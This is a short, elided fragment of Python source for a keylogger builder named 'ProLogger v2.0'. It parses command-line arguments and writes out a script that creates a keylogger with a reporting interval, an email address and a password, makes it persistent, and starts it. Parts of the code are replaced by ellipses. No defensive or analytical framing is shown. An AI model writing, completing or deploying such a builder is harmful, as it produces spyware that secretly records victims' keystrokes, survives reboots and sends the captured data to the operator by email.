...
def get_arguments():
    parser = argparse.ArgumentParser(description='ProLogger v2.0')
...
def create_keylogger(file_name, interval, email, password):
    with open(file_name, "w+") as file:
        ...
        file.write("Prologger = keylogger.Keylogger(" + interval + ",'" + email + "','" + password + "')\n")
        file.write("Prologger.become_persistent()\n")
        file.write("Prologger.start()\n")
